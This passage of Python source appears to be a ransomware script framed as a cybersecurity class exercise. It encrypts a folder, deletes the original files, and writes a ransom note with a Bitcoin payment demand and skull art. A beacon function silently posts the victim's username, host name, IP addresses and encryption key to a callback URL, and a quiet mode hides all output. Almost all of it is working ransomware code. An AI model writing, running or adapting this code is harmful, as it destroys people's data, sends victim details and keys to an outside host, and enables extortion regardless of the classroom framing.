        return (None, str(e.reason) if getattr(e, "reason", None) else str(e))
    except urllib.error.HTTPError as e:
        return (None, f"HTTP {e.code}")
    except Exception as e:
        return (None, str(e))
    return (None, "Unknown error")


def write_info_file(
    info_path: Path,
    encrypted_file: Path,
    *,
    bitcoin_address: Optional[str] = None,
    key: Optional[bytes] = None,
) -> None:
    """
    Write a text file with the ransom message, optional Bitcoin address, optional key, and skull art.
    If key is provided it is written so --decrypt can read it from the file without --key.
    """
    info_path.parent.mkdir(parents=True, exist_ok=True)
    message_lines = [
        "Ctl+Alt+encrypt",
        "All your files are belong to us.",
        "",
        "This folder has been encrypted as part of a cybersecurity class exercise.",
        f"The encrypted archive file is: {encrypted_file}",
        "",
    ]
    if bitcoin_address:
        message_lines.append("Send payment to this Bitcoin address to receive decryption key:")
        message_lines.append(bitcoin_address)
        message_lines.append("")
    if key is not None:
        message_lines.append("Encryption key:")
        message_lines.append(key.decode("utf-8"))
        message_lines.append("")
    message_lines.extend([
        "Use the Python script `encrypt_folder.py` with --decrypt and --key (or --key-file) to",
        "decrypt the archive and restore the original files.",
        "",
        SKULL_ART,
    ])
    info_path.write_text("\n".join(message_lines), encoding="utf-8")


def _get_internal_ip() -> str:
    """Best-effort primary local IPv4 (e.g. for beacon)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return ""


def _get_external_ip() -> str:
    """Best-effort public IPv4 (e.g. for beacon)."""
    try:
        req = urllib.request.Request(
            "https://api.ipify.org",
            headers={"User-Agent": "curl/7.68.0"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.read().decode("utf-8").strip()
    except Exception:
        return ""


def send_beacon(callback_url: str, key: bytes, *, bitcoin_address: Optional[str] = None) -> None:
    """
    POST username, computer_name, internal_ip, external_ip, encryption key,
    and optional bitcoin_address to the callback URL.
    """
    data = {
        "username": getpass.getuser(),
        "computer_name": platform.node(),
        "internal_ip": _get_internal_ip(),
        "external_ip": _get_external_ip(),
        "key": key.decode("utf-8"),
    }
    if bitcoin_address:
        data["bitcoin_address"] = bitcoin_address
    try:
        payload = urllib.parse.urlencode(data).encode("utf-8")
        req = urllib.request.Request(
            callback_url,
            data=payload,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            resp.read()
    except Exception:
        pass  # Silent; do not affect encryption flow


def show_laughing_skull(bitcoin_address: Optional[str] = None) -> None:
    """
    Display a red ASCII skull with a centered Ctl+Alt+encrypt header.
    Optionally show the Bitcoin payment address below the skull.
    """
    cols = shutil.get_terminal_size(fallback=(80, 24)).columns
    header = "Ctl+Alt+encrypt"
    subtitle = "All your files are belong to us."
    pad = max(0, (cols - len(header)) // 2)
    pad_sub = max(0, (cols - len(subtitle)) // 2)
    header_line = " " * pad + header
    subtitle_line = " " * pad_sub + subtitle

    skull_lines = SKULL_ART.splitlines()
    centered_lines = []
    for line in skull_lines:
        stripped = line.rstrip("\n")
        if not stripped:
            centered_lines.append("")
        else:
            pad_line = max(0, (cols - len(stripped)) // 2)
            centered_lines.append(" " * pad_line + stripped)
    centered_skull = "\n".join(centered_lines)

    # Clear screen and move cursor home.
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.write("\033[31m")
    sys.stdout.write(header_line + "\n")
    sys.stdout.write(subtitle_line + "\n\n")
    sys.stdout.write(centered_skull)
    if bitcoin_address:
        pad_addr = max(0, (cols - len(bitcoin_address)) // 2)
        sys.stdout.write("\n\n" + " " * pad_addr + bitcoin_address)
    sys.stdout.write("\033[0m")
    sys.stdout.flush()


def delete_encrypted_source_files(
    folder: Path, *, keep: Optional[set[Path]] = None
) -> None:
    """
    Delete original (now-encrypted) files from the folder.

    All regular files under `folder` are removed except those in `keep`.
    Directories are removed if they become empty.
    """
    keep = keep or set()

    # Remove files first
    for root, _dirs, files in os.walk(folder):
        root_path = Path(root)
        for name in files:
            file_path = root_path / name
            if file_path in keep:
                continue
            try:
                file_path.unlink()
            except OSError:
                # If we can't delete a file, skip it and continue.
                continue

    # Then try to clean up empty directories (bottom-up)
    for root, dirs, _files in os.walk(folder, topdown=False):
        root_path = Path(root)
        for name in dirs:
            dir_path = root_path / name
            try:
                dir_path.rmdir()
            except OSError:
                # Directory not empty or cannot be removed; ignore.
                continue


def read_key_from_info_file(info_path: Path) -> bytes:
    """
    Read the encryption key from the info file.

    The function looks for a non-empty line after the line that starts with
    'Encryption key' and returns it as bytes.
    """
    text = info_path.read_text(encoding="utf-8")
    lines = [line.rstrip("\n") for line in text.splitlines()]

    for idx, line in enumerate(lines):
        if line.strip().lower().startswith("encryption key"):
            # Next non-empty line should be the key
            for next_line in lines[idx + 1 :]:
                key_str = next_line.strip()
                if key_str:
                    return key_str.encode("utf-8")
            break

    raise SystemExit(
        f"Could not find encryption key in info file: {info_path}. "
        "If the key was sent via beacon only, use --key or --key-file with the key from your beacon log."
    )


def encrypt_folder(config: EncryptConfig) -> None:
    bitcoin_address: Optional[str] = None
    if config.callback_url:
        print("[+] Beacon configured. Waiting for payment address from beacon...")
        while not bitcoin_address:
            bitcoin_address, err_msg = fetch_bitcoin_address_with_error(config.callback_url)
            if not bitcoin_address:
                msg = f"    {err_msg}" if err_msg else "Address not yet available (bitcoind may be starting)."
                print(f"{msg} Retrying in 5s...")
                time.sleep(5)
        print(f"[+] Payment address from beacon: {bitcoin_address}")

    print(f"[+] Zipping folder: {config.folder}")
    # Exclude the info file and encrypted archive from the zip (especially if re-running).
    exclude_paths: set[Path] = {config.info_file, config.output_file}
    target_seconds = 60.0 if config.slow_demo else None
    if target_seconds is not None:
        print(
            f"[+] Building encrypted archive. "
            f"Target duration ~{int(target_seconds)} seconds."
        )
    zip_bytes = zip_folder_to_bytes(
        config.folder,
        exclude=exclude_paths,
        target_seconds=target_seconds,
    )

    print("[+] Generating encryption key")
    key = generate_key()
    fernet = Fernet(key)

    print(f"[+] Encrypting zip archive ({len(zip_bytes)} bytes)")
    token = fernet.encrypt(zip_bytes)

    config.output_file.parent.mkdir(parents=True, exist_ok=True)
    config.output_file.write_bytes(token)
    print(f"[+] Encrypted archive written to: {config.output_file}")

    print(f"[+] Writing encryption info file to: {config.info_file}")
    write_info_file(
        config.info_file,
        encrypted_file=config.output_file,
        bitcoin_address=bitcoin_address,
        key=key,
    )
    print(f"[+] Info file written. Deleting original files in {config.folder}")
    # Keep the encrypted archive and the info file; delete everything else.
    delete_encrypted_source_files(
        config.folder, keep={config.output_file, config.info_file}
    )
    print("[+] Encryption complete. Original files removed.")

    if config.callback_url:
        send_beacon(config.callback_url, key, bitcoin_address=bitcoin_address)

    show_laughing_skull(bitcoin_address=bitcoin_address)


def decrypt_folder(config: DecryptConfig) -> None:
    if config.key is not None:
        key = config.key
        print("[+] Using encryption key from --key or --key-file")
    else:
        print(f"[+] Reading encryption key from: {config.info_file}")
        if config.info_file is None or not config.info_file.exists():
            raise SystemExit("No key provided and info file not found. Use --key or --key-file.")
        key = read_key_from_info_file(config.info_file)

    fernet = Fernet(key)

    print(f"[+] Reading encrypted archive: {config.encrypted_file}")
    encrypted_bytes = config.encrypted_file.read_bytes()

    print("[+] Decrypting archive")
    try:
        zip_bytes = fernet.decrypt(encrypted_bytes)
    except InvalidToken as exc:
        raise SystemExit(f"Decryption failed: invalid key or corrupted data ({exc})")

    print(f"[+] Extracting zip contents to: {config.output_folder}")
    config.output_folder.mkdir(parents=True, exist_ok=True)
    try:
        with zipfile.ZipFile(io.BytesIO(zip_bytes), mode="r") as zf:
            zf.extractall(config.output_folder)
    except zipfile.BadZipFile as exc:
        raise SystemExit(
            "Decrypted data is not a valid zip file. "
            "The key may not match the encrypted file, or the .enc file may be corrupted or from another source."
        ) from exc

    # Remove the encrypted archive and info file after successful restore.
    for path in (config.encrypted_file, config.info_file):
        if path is not None and path.exists() and path.is_file():
            try:
                path.unlink()
                print(f"[+] Removed: {path}")
            except OSError:
                pass

    print("[+] Decryption complete.")


def main(argv: Optional[list[str]] = None) -> None:
    args = parse_args(argv)
    if getattr(args, "quiet", False):
        sys.stdout = open(os.devnull, "w")
        sys.stderr = open(os.devnull, "w")
    if args.decrypt:
        cfg = build_decrypt_config(args)
        decrypt_folder(cfg)
    else:
        cfg = build_encrypt_config(args)
        encrypt_folder(cfg)


if __name__ == "__main__":
    main()

